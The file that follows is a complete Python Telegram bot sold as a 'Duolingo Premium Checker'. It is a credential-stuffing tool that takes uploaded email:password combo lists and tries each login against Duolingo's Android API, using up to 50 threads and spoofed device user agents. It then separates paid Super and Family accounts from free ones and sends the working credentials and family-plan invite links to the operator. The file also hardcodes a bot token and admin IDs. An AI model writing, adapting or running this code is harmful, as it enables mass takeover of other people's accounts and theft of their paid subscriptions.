import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import json
import time
import uuid
import logging
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_IDS = [8770379893, 1859432548]
MAX_THREADS = 50
BATCH_SIZE = 10000
PROGRESS_INTERVAL = 1000  # 1000 combos per update
# ===================================

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')

bot = telebot.TeleBot(BOT_TOKEN)

checking_active = False
stop_flag = False
current_executor = None
current_futures = None

# Store hits
all_super_hits = []
all_family_hits = []
all_free_accounts = []
hits_per_page = 10

# Stats
super_count = 0
family_count = 0
free_count = 0
fail_count = 0

# Batch stats for "Last 1000"
last_batch_super = 0
last_batch_family = 0
last_batch_free = 0
last_batch_fail = 0

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    versions = ["10", "11", "12", "13", "14"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro"]
    return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"

def is_premium_account(data):
    shop_items = data.get("shopItems", [])
    for item in shop_items:
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            return True, "FAMILY", family_info.get("inviteToken")
    
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            product_id = sub_info.get("productId", "")
            if "trial" in product_id.lower():
                continue
            if product_id and product_id != "N/A":
                return True, "SUPER", None
    
    if data.get("has_item_premium_subscription") == True:
        return True, "SUPER", None
    
    if data.get("hasPlus") == True:
        return True, "SUPER", None
    
    return False, "FREE", None

def extract_subscription_details(data):
    details = {
        "product_id": "Unknown",
        "renewing": "Unknown",
        "expiry": "Unknown",
        "invite_token": None
    }
    
    shop_items = data.get("shopItems", [])
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            if sub_info.get("productId"):
                details["product_id"] = sub_info.get("productId")
            if sub_info.get("renewing") is not None:
                details["renewing"] = "Yes ✅" if sub_info.get("renewing") else "No ❌"
            if sub_info.get("expectedExpiration"):
                expiry_ms = sub_info.get("expectedExpiration")
                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            details["invite_token"] = family_info.get("inviteToken")
    
    return details

def check_single_account(email, password):
    if stop_flag:
        return email, password, "STOPPED", None, None
    
    session = requests.Session()
    ua = generate_ua()
    
    try:
        login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
        distinct_id = str(uuid.uuid4())
        
        login_payload = {
            "distinctId": distinct_id,
            "identifier": email,
            "password": password
        }
        
        login_headers = get_headers(ua)
        login_headers["Content-Type"] = "application/json"
        
        resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
        
        if resp.status_code != 200:
            return email, password, "FAIL", "wrong credentials", None
        
        login_data = resp.json()
        user_id = login_data.get("id")
        if not user_id:
            return email, password, "FAIL", "no user id", None
        
        jwt_token = None
        for cookie in session.cookies:
            if cookie.name == "jwt_token":
                jwt_token = cookie.value
                break
        
        if not jwt_token:
            return email, password, "FAIL", "no jwt token", None
        
        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CcreatedAt"
        
        profile_headers = get_headers(ua, jwt_token)
        
        resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
        
        if resp2.status_code != 200:
            return email, password, "FAIL", f"profile error {resp2.status_code}", None
        
        data = resp2.json()
        
        username = data.get("username", "N/A")
        total_xp = data.get("totalXp", 0)
        streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
        learning_lang = data.get("learningLanguage", "N/A")
        from_lang = data.get("fromLanguage", "N/A")
        
        created_at_raw = data.get("createdAt", None)
        if created_at_raw:
            try:
                if isinstance(created_at_raw, (int, float)):
                    created_date = datetime.fromtimestamp(created_at_raw / 1000).strftime("%Y-%m-%d")
                else:
                    created_date = str(created_at_raw)[:10]
            except:
                created_date = "Unknown"
        else:
            created_date = "Unknown"
        
        is_premium, plan_type, invite_token = is_premium_account(data)
        
        if not is_premium:
            return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}", None
        
        sub_details = extract_subscription_details(data)
        if invite_token:
            sub_details["invite_token"] = invite_token
        
        if plan_type == "FAMILY":
            result = f"""
╔════════════════════════════════════╗
║      🎉 PREMIUM ACCOUNT FOUND      ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│        👨‍👩‍👧 FAMILY PLAN           │
├────────────────────────────────────┤
│  📧 Email    : `{email}:{password}` │
│  👤 Username : `{username}`         │
│  ⭐ XP       : `{total_xp:,}`       │
│  🔥 Streak   : `{streak} days`      │
│  🌍 Learning : `{learning_lang}` → `{from_lang}` │
│  📅 Created  : `{created_date}`     │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│         💎 SUBSCRIPTION            │
├────────────────────────────────────┤
│  Product    : `{sub_details['product_id']}` │
│  Renew      : `{sub_details['renewing']}`   │
│  Expires    : `{sub_details['expiry']}`     │
└────────────────────────────────────┘
"""
            if sub_details["invite_token"]:
                result += f"\n🔗 **INVITE LINK:**\n`https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}`"
        else:
            result = f"""
╔════════════════════════════════════╗
║      🎉 PREMIUM ACCOUNT FOUND      ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│           👑 SUPER PREMIUM         │
├────────────────────────────────────┤
│  📧 Email    : `{email}:{password}` │
│  👤 Username : `{username}`         │
│  ⭐ XP       : `{total_xp:,}`       │
│  🔥 Streak   : `{streak} days`      │
│  🌍 Learning : `{learning_lang}` → `{from_lang}` │
│  📅 Created  : `{created_date}`     │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│         💎 SUBSCRIPTION            │
├────────────────────────────────────┤
│  Product    : `{sub_details['product_id']}` │
│  Renew      : `{sub_details['renewing']}`   │
│  Expires    : `{sub_details['expiry']}`     │
└────────────────────────────────────┘
"""
        
        result += f"\n\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
        
        return email, password, "HIT", result, plan_type
        
    except Exception as e:
        return email, password, "FAIL", str(e)[:40], None

def send_main_menu(chat_id):
    global super_count, family_count
    
    total_hits = len(all_super_hits) + len(all_family_hits)
    today_hits = super_count + family_count
    
    admin_name = "thuyaaungzaw"
    
    menu_text = f"""
╔════════════════════════════════════╗
║       🦉 DUOLINGO PREMIUM          ║
║          ACCOUNT CHECKER           ║
║            BY ThuYa V3             ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│           👤 USER PROFILE          │
├────────────────────────────────────┤
│  Name     : @{admin_name}          │
│  ID       : {ADMIN_IDS[0]}         │
│  Role     : 👑 Premium Owner       │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│          ⚙️ SYSTEM STATUS          │
├────────────────────────────────────┤
│  Gateways : 🟢 {MAX_THREADS}/50 Online │
│  Mode     : 🔥 Active              │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│           📊 QUICK STATS           │
├────────────────────────────────────┤
│  Today HIT   : 👑 {super_count}  👨‍👩‍👧 {family_count} │
│  Total HIT   : {total_hits}        │
└────────────────────────────────────┘
"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("🚀 START CHECKING", callback_data="start_check"))
    markup.row(
        InlineKeyboardButton("📊 STATS", callback_data="my_stats"),
        InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
    )
    markup.row(
        InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
        InlineKeyboardButton("❌ EXIT", callback_data="close_panel")
    )
    
    bot.send_message(chat_id, menu_text, parse_mode='Markdown', reply_markup=markup)

def send_hits_list(chat_id, page=0):
    global all_super_hits, all_family_hits, hits_per_page
    
    total_hits = len(all_super_hits) + len(all_family_hits)
    if total_hits == 0:
        bot.send_message(chat_id, "📭 No premium hits yet.", parse_mode='Markdown')
        return
    
    all_hits = []
    for email, pwd, result in all_super_hits:
        all_hits.append(("👑 SUPER", email, pwd))
    for email, pwd, result in all_family_hits:
        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd))
    
    total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
    if page >= total_pages:
        page = total_pages - 1
    if page < 0:
        page = 0
    
    start = page * hits_per_page
    end = min(start + hits_per_page, len(all_hits))
    
    hit_list_text = ""
    for i, (plan, email, pwd) in enumerate(all_hits[start:end], start=start+1):
        hit_list_text += f"  {i}. {plan} │ `{email}:{pwd}`\n"
    
    message_text = f"""
╔════════════════════════════════════╗
║           💾 PREMIUM HITS          ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│  👑 SUPER PREMIUM : {len(all_super_hits)}    │
│  👨‍👩‍👧 FAMILY PLAN : {len(all_family_hits)}    │
└────────────────────────────────────┘

📋 Page {page+1}/{total_pages}

{hit_list_text}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Click COPY ALL to get full details
"""
    
    markup = InlineKeyboardMarkup(row_width=3)
    buttons = []
    if page > 0:
        buttons.append(InlineKeyboardButton("◀️ PREV", callback_data=f"hits_page_{page-1}"))
    buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        buttons.append(InlineKeyboardButton("NEXT ▶️", callback_data=f"hits_page_{page+1}"))
    markup.row(*buttons)
    markup.row(
        InlineKeyboardButton("📋 COPY ALL", callback_data="copy_all_hits"),
        InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits"),
        InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu")
    )
    
    bot.send_message(chat_id, message_text, parse_mode='Markdown', reply_markup=markup)

def send_stats(chat_id):
    global super_count, family_count, free_count, fail_count, MAX_THREADS
    global all_super_hits, all_family_hits
    
    total_hits = len(all_super_hits) + len(all_family_hits)
    total_checked = super_count + family_count + free_count + fail_count
    
    stats_text = f"""
╔════════════════════════════════════╗
║            📊 STATISTICS           ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│           TODAY'S STATS            │
├────────────────────────────────────┤
│  👑 SUPER PREMIUM : {super_count}         │
│  👨‍👩‍👧 FAMILY PLAN : {family_count}         │
│  ⚠️ FREE ACCOUNTS : {free_count}          │
│  ❌ FAILED       : {fail_count}           │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│           TOTAL STATS              │
├────────────────────────────────────┤
│  📋 CHECKED      : {total_checked}        │
│  🎯 TOTAL HITS   : {total_hits}           │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│           SYSTEM INFO              │
├────────────────────────────────────┤
│  ⚙️ THREADS      : {MAX_THREADS}          │
│  🟢 STATUS       : Online          │
└────────────────────────────────────┘
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu"))
    bot.send_message(chat_id, stats_text, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global MAX_THREADS, checking_active, stop_flag, current_executor, current_futures
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits
    
    if call.data == "start_check":
        bot.answer_callback_query(call.id)
        if checking_active:
            bot.send_message(call.message.chat.id, "⚠️ A check is already running. Use /stop first.")
            return
        bot.send_message(call.message.chat.id, "📎 Send your *email:pass* combo file (.txt)", parse_mode='Markdown')
    
    elif call.data == "my_stats":
        bot.answer_callback_query(call.id)
        send_stats(call.message.chat.id)
    
    elif call.data == "view_hits":
        bot.answer_callback_query(call.id)
        send_hits_list(call.message.chat.id, 0)
    
    elif call.data == "tools":
        bot.answer_callback_query(call.id)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⚙️ SET THREADS", callback_data="thread_settings"),
            InlineKeyboardButton("🗑️ CLEAR HITS", callback_data="clear_hits")
        )
        markup.add(InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu"))
        bot.send_message(call.message.chat.id, "⚙️ **SETTINGS MENU**\n━━━━━━━━━━━━━━━━━━\nSelect an option:", parse_mode='Markdown', reply_markup=markup)
    
    elif call.data == "thread_settings":
        bot.answer_callback_query(call.id)
        markup = InlineKeyboardMarkup(row_width=3)
        markup.row(
            InlineKeyboardButton("20", callback_data="set_threads_20"),
            InlineKeyboardButton("30", callback_data="set_threads_30"),
            InlineKeyboardButton("50", callback_data="set_threads_50")
        )
        markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
        bot.send_message(call.message.chat.id, f"⚙️ Current Threads: `{MAX_THREADS}`\nSelect new value:", parse_mode='Markdown', reply_markup=markup)
    
    elif call.data.startswith("set_threads_"):
        new_threads = int(call.data.split("_")[2])
        MAX_THREADS = new_threads
        bot.answer_callback_query(call.id, f"Threads set to {new_threads}")
        send_main_menu(call.message.chat.id)
    
    elif call.data == "clear_hits":
        bot.answer_callback_query(call.id)
        all_super_hits = []
        all_family_hits = []
        super_count = 0
        family_count = 0
        free_count = 0
        fail_count = 0
        bot.send_message(call.message.chat.id, "✅ All hits cleared!")
        send_main_menu(call.message.chat.id)
    
    elif call.data == "main_menu":
        bot.answer_callback_query(call.id)
        send_main_menu(call.message.chat.id)
    
    elif call.data == "close_panel":
        bot.answer_callback_query(call.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "noop":
        bot.answer_callback_query(call.id)
    
    elif call.data == "refresh_hits":
        bot.answer_callback_query(call.id)
        send_hits_list(call.message.chat.id, 0)
    
    elif call.data == "copy_all_hits":
        bot.answer_callback_query(call.id)
        all_hits_text = ""
        for email, pwd, result in all_super_hits:
            all_hits_text += f"{email}:{pwd}\n"
        for email, pwd, result in all_family_hits:
            all_hits_text += f"{email}:{pwd}\n"
        
        if all_hits_text:
            if len(all_hits_text) > 4000:
                parts = [all_hits_text[i:i+4000] for i in range(0, len(all_hits_text), 4000)]
                for i, part in enumerate(parts):
                    bot.send_message(call.message.chat.id, f"📋 **Premium Hits (Part {i+1}/{len(parts)}):**\n```\n{part}```", parse_mode='Markdown')
            else:
                bot.send_message(call.message.chat.id, f"📋 **All Premium Hits:**\n```\n{all_hits_text}```", parse_mode='Markdown')
        else:
            bot.send_message(call.message.chat.id, "📭 No hits to copy.")
    
    elif call.data.startswith("hits_page_"):
        page = int(call.data.split("_")[2])
        send_hits_list(call.message.chat.id, page)

def process_combos(chat_id, combos):
    global checking_active, stop_flag, current_executor, current_futures
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits, all_free_accounts
    global last_batch_super, last_batch_family, last_batch_free, last_batch_fail
    
    checking_active = True
    stop_flag = False
    
    super_count = 0
    family_count = 0
    free_count = 0
    fail_count = 0
    all_super_hits = []
    all_family_hits = []
    all_free_accounts = []
    
    # Reset batch counters
    last_batch_super = 0
    last_batch_family = 0
    last_batch_free = 0
    last_batch_fail = 0
    
    total = len(combos)
    completed = 0
    start_time = time.time()
    last_update = 0
    
    status_msg = bot.send_message(chat_id, "🔄 Starting check...")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        current_executor = executor
        futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
        current_futures = futures
        
        for future in as_completed(futures):
            if stop_flag:
                for f in futures:
                    f.cancel()
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            completed += 1
            percent = (completed / total) * 100
            elapsed = time.time() - start_time
            
            try:
                email, password, status, detail, plan_type = future.result(timeout=30)
            except:
                continue
            
            if status == "HIT":
                if plan_type == "FAMILY":
                    family_count += 1
                    last_batch_family += 1
                    all_family_hits.append((email, password, detail))
                else:
                    super_count += 1
                    last_batch_super += 1
                    all_super_hits.append((email, password, detail))
                bot.send_message(chat_id, detail, parse_mode='Markdown')
                logging.info(f"✅ HIT: {email}")
            elif status == "FREE":
                free_count += 1
                last_batch_free += 1
                logging.info(f"⚠️ FREE: {email}")
            elif status == "STOPPED":
                break
            else:
                fail_count += 1
                last_batch_fail += 1
                logging.info(f"❌ FAIL: {email}")
            
            # Update progress every 1000 combos
            if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                last_update = completed
                bar_length = int(percent / 5)
                progress_bar = "▓" * bar_length + "░" * (20 - bar_length)
                
                progress_text = f"""
╔════════════════════════════════════╗
║         🦉 CHECKING STATUS         ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│  ⏱️ Time     : {elapsed:.1f}s              │
│  📍 Checked  : {completed:,}/{total:,}    │
│  🚀 Threads  : {MAX_THREADS}               │
└────────────────────────────────────┘

[{progress_bar}] {percent:.1f}%

┌────────────────────────────────────┐
│  👑 SUPER     : {super_count:,}           │
│  👨‍👩‍👧 FAMILY   : {family_count:,}           │
│  ⚠️ FREE      : {free_count:,}           │
│  ❌ FAIL      : {fail_count:,}           │
└────────────────────────────────────┘

📊 **Last {PROGRESS_INTERVAL} checked:**
   👑 {last_batch_super} HIT  |  👨‍👩‍👧 {last_batch_family} FAMILY
   ⚠️ {last_batch_free} FREE  |  ❌ {last_batch_fail} FAIL

💡 Use /stop to cancel
"""
                try:
                    bot.edit_message_text(progress_text, status_msg.message_id, chat_id, parse_mode='Markdown')
                except:
                    pass
                
                # Reset batch counters
                last_batch_super = 0
                last_batch_family = 0
                last_batch_free = 0
                last_batch_fail = 0
    
    # Final summary
    elapsed = time.time() - start_time
    total_hits = super_count + family_count
    final_text = f"""
╔════════════════════════════════════╗
║         ✅ CHECK COMPLETED         ║
╚════════════════════════════════════╝

┌────────────────────────────────────┐
│  ⏱️ Time     : {elapsed:.1f}s              │
│  📍 Total    : {total:,}                   │
│  🚀 Threads  : {MAX_THREADS}               │
└────────────────────────────────────┘

┌────────────────────────────────────┐
│  👑 SUPER PREMIUM : {super_count:,}         │
│  👨‍👩‍👧 FAMILY PLAN : {family_count:,}         │
│  ⚠️ FREE ACCOUNTS : {free_count:,}          │
│  ❌ FAILED       : {fail_count:,}           │
└────────────────────────────────────┘

💾 Total Hits: {total_hits:,}

Click 💾 HITS in main menu to view all premium accounts
"""
    bot.send_message(chat_id, final_text, parse_mode='Markdown')
    send_main_menu(chat_id)
    
    checking_active = False
    stop_flag = False
    current_executor = None
    current_futures = None

@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized user.")
        return
    send_main_menu(message.chat.id)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_flag, checking_active, current_executor, current_futures
    
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    
    if checking_active:
        stop_flag = True
        if current_futures:
            for future in current_futures:
                future.cancel()
        if current_executor:
            current_executor.shutdown(wait=False, cancel_futures=True)
        bot.reply_to(message, "🛑 **Stopped immediately!**", parse_mode='Markdown')
    else:
        bot.reply_to(message, "ℹ️ No active check.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global checking_active
    
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized")
        return
    
    if checking_active:
        bot.reply_to(message, "⚠️ Check running. Use /stop first.")
        return
    
    status_msg = bot.reply_to(message, "📥 Downloading...")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    combos = []
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line and line.count(':') == 1:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
    
    if not combos:
        bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
        return
    
    bot.edit_message_text(f"📥 `{len(combos):,}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...\n📊 Update every {PROGRESS_INTERVAL} combos", status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
    
    thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
    thread.daemon = True
    thread.start()

print("🤖 Duolingo Premium Checker Bot is running...")
print("═" * 50)
print(f"  Admin IDs: {ADMIN_IDS}")
print(f"  Threads: {MAX_THREADS}")
print(f"  Progress Interval: {PROGRESS_INTERVAL} combos")
print(f"  Features: Box UI | Inline Menu | No TXT Files")
print("═" * 50)
bot.infinity_polling()
